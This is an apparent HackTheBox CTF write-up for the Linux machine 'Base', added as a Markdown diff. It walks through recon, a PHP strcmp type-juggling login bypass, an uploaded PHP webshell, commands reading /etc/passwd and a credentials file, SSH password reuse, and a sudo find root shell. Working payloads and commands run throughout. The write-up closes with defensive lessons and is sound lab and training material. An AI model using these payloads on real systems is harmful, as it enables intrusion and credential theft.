@@ -1,0 +1,222 @@
+# HackTheBox — Base
+
+**Difficulty:** Easy
+**OS:** Linux
+**Target:** 10.129.47.59
+
+## Summary
+
+Base is an easy Linux machine centered around a static Bootstrap-template website with a hidden login portal. Initial access is gained by exploiting a PHP type-juggling flaw in a `strcmp()` authentication check, discovered by reading a leftover Vim swap file. The login bypass leads to a file upload feature, which is abused to drop a PHP webshell. Enumeration via the webshell uncovers hardcoded admin credentials in a config file, which are reused for SSH access as a real system user. Privilege escalation to root is achieved through a sudo misconfiguration allowing `find` to be run as root, abused via GTFOBins to spawn a root shell.
+
+---
+
+## Recon
+
+### Nmap
+
+```
+nmap -sC -sV 10.129.47.59
+```
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome to Base
+```
+
+Two open ports: SSH (noted for later, once credentials are found) and HTTP, serving a site titled "Base."
+
+### Web enumeration
+
+The site (`base.htb`) is a static one-page Bootstrap template. Every nav link (pricing, services, team, etc.) scrolls to a section on the same page rather than loading new content — there's no server-side functionality behind most of it.
+
+Two areas stood out as interactive:
+- A **contact form**, which on submission always returned: *"There was an issue sending your message. Please call us instead."*
+- A **login page**.
+
+Browsing to `/assets/` revealed Apache was serving a **directory listing** (misconfigured `Options Indexes`), exposing the site's raw CSS/JS/image source tree.
+
+Checking `/forms/` also returned a directory listing, containing a `Readme.txt`:
+
+```
+Fully working PHP/AJAX contact form script is available in the pro version of the template.
+You can buy it from: https://bootstrapmade.com/onepage-multipurpose-bootstrap-template/
+```
+
+This confirmed the contact form was a stub from a paid template — never fully implemented — explaining the earlier error message, and suggesting the site was deployed somewhat carelessly.
+
+### Credential brute force (abandoned)
+
+An initial attempt was made to brute-force the login form with `hydra`, using a custom username list built from names found on the site's "Team" section, against `rockyou.txt`:
+
+```
+hydra -L base_users.txt -P /usr/share/wordlists/rockyou.txt 10.129.47.59 http-post-form \
+  "/login/login.php:username=^USER^&password=^PASS^:F=Wrong Username or Password"
+```
+
+This approach was far too slow (143M+ combinations) and was abandoned in favor of directly auditing the login mechanism instead.
+
+---
+
+## Initial Foothold
+
+### Finding the source via a leftover Vim swap file
+
+Browsing `/login/` also returned a directory listing:
+
+```
+Index of /login
+config.php
+login.php
+login.php.swp
+```
+
+The `login.php.swp` file is a Vim swap file — an editor artifact accidentally left on the server. Downloading it and running `strings` on it recovered the working source of `login.php`:
+
+```php
+<?php
+session_start();
+require('config.php');
+if (!empty($_POST['username']) && !empty($_POST['password'])) {
+    if (strcmp($username, $_POST['username']) == 0) {
+        if (strcmp($password, $_POST['password']) == 0) {
+            $_SESSION['user_id'] = 1;
+            header("Location: /upload.php");
+        } else {
+            print("<script>alert('Wrong Username or Password')</script>");
+        }
+    } else {
+        print("<script>alert('Wrong Username or Password')</script>");
+    }
+}
+```
+
+### PHP type-juggling authentication bypass
+
+The login logic compares user-supplied credentials against the real ones using `strcmp()`. In PHP, `strcmp()` expects two strings. If instead it is passed an **array**, it cannot perform the comparison and returns `NULL`. Due to PHP's loose (`==`) comparison rules, `NULL == 0` evaluates to `true` — so the check silently passes.
+
+By submitting the username and password as **array parameters** rather than strings (appending `[]` to the field names in the POST body), the comparison breaks in the attacker's favor:
+
+```bash
+curl -i -X POST http://10.129.47.59/login/login.php -d "username[]=x&password[]=x"
+```
+
+This bypassed authentication entirely (no valid credentials required) and returned a redirect to `/upload.php`, confirming access to the authenticated upload interface.
+
+---
+
+## Gaining Code Execution
+
+### Uploading a PHP webshell
+
+With access to `/upload.php`, a PHP file was uploaded to the server. Initial attempts at a classic parameterized webshell:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+returned blank pages / 500 errors. Troubleshooting determined:
+- `ini_get('disable_functions')` showed only `pcntl_*` functions disabled — `system()` itself was *not* blocked.
+- Payloads using `$_GET` parameters consistently failed, while a fully **hardcoded** payload (no dynamic input) executed successfully — likely due to a filter/WAF inspecting the query string.
+
+Given this constraint, the approach shifted to a single hardcoded enumeration payload, re-uploaded as more commands were needed:
+
+```php
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+echo "<pre>";
+
+echo "ID:\n";            system('id 2>&1');
+echo "\nSUDO:\n";         system('sudo -l 2>&1');
+echo "\nSUID:\n";         system('find / -perm -4000 -type f 2>/dev/null');
+echo "\nCRON:\n";         system('cat /etc/crontab 2>&1; ls -la /etc/cron.d /etc/cron.daily');
+echo "\nWEB ROOT:\n";      system('ls -la /var/www/html 2>&1');
+echo "\nLOGIN CONFIG:\n";  system('cat /var/www/html/login/config.php 2>&1');
+echo "\nPASSWD:\n";        system('cat /etc/passwd 2>&1');
+echo "\nHOME DIRS:\n";     system('ls -la /home 2>&1');
+
+echo "</pre>";
+?>
+```
+
+This confirmed command execution as `www-data`, with no useful sudo rights or SUID binaries at this stage, and surfaced a real system user: **`john`** (home directory `/home/john`, shell `/bin/bash`).
+
+### A rendering gotcha: hidden PHP source
+
+An attempt to `cat` `/var/www/html/login/config.php` initially appeared to return nothing. The file *was* being read correctly — but since its contents began with `<?php`, the browser interpreted it as an unrecognized HTML tag and silently discarded it when rendering the page. Using **View Page Source** (Ctrl+U) revealed the raw, unrendered output, including the file's real content:
+
+```php
+<?php
+$username = "admin";
+$password = "thisisagoodpassword";
+```
+
+These are the hardcoded credentials referenced by `login.php`'s `strcmp()` check — not actually needed for the bypass used earlier, but valuable on their own as a potential case of **credential reuse**.
+
+---
+
+## User Access
+
+The discovered credentials (`admin` / `thisisagoodpassword`) did not correspond to any system account directly, but were tested against the one real user found in `/etc/passwd`: **`john`**.
+
+```bash
+ssh john@10.129.47.59
+# password: thisisagoodpassword
+```
+
+This succeeded — the admin panel's password had been reused for the `john` system account.
+
+```
+john@base:~$ cat user.txt
+f54846c258f3b4612f78a819573d158e
+```
+
+---
+
+## Privilege Escalation
+
+With a proper interactive shell as `john` (rather than the webshell, which lacked a TTY and couldn't run `sudo -l` correctly), re-checking sudo permissions revealed:
+
+```
+john@base:~$ sudo -l
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+```
+
+`john` can run `/usr/bin/find` as root with no password. This is a well-documented privilege escalation vector (see [GTFOBins: find](https://gtfobins.github.io/gtfobins/find/)): `find`'s `-exec` flag can be used to spawn an arbitrary command, which inherits the privileges of the `find` process itself.
+
+```bash
+sudo /usr/bin/find . -exec /bin/sh \; -quit
+```
+
+```
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+51709519ea18ab37dd6fc58096bea949
+```
+
+Root achieved.
+
+---
+
+## Attack Chain Summary
+
+1. **Recon** — Nmap reveals SSH + Apache. Static site with a non-functional contact form and a login page.
+2. **Information disclosure** — Open directory listings on `/assets`, `/forms`, and `/login` expose a leftover Vim swap file, `login.php.swp`.
+3. **Source disclosure** — `strings` on the swap file recovers the login script's PHP source.
+4. **Auth bypass** — PHP type-juggling flaw in `strcmp()` usage allows login bypass via array parameters (`username[]=x&password[]=x`).
+5. **File upload abuse** — Authenticated upload feature used to drop a PHP webshell.
+6. **Enumeration via webshell** — Hardcoded recon payloads (dynamic `$_GET` input blocked by a filter) reveal a real system user (`john`) and a config file with hardcoded admin credentials.
+7. **Credential reuse** — Web admin credentials reused for `john`'s SSH account.
+8. **Privilege escalation** — `sudo` misconfiguration allows `john` to run `/usr/bin/find` as root; abused via `-exec` to spawn a root shell.
+
+## Lessons / Takeaways
+
+- **Never trust `strcmp()` (or any loose `==` comparison) with user-controlled input in PHP** — use `===` and type checks, or a constant-time comparison function intended for secrets (e.g. `hash_equals()`).
+- **Editor swap files, backups, and other artifacts should never be deployed to production** — they frequently leak full source code.
+- **Directory listings should be disabled** on production web servers (`Options -Indexes` in Apache).
+- **Credentials should never be reused** across a web application and real system/service accounts.
+- **Sudo rules should be scoped as tightly as possible** — allowing `find` (or any GTFOBins-listed binary) as root with no restrictions is equivalent to full root access.
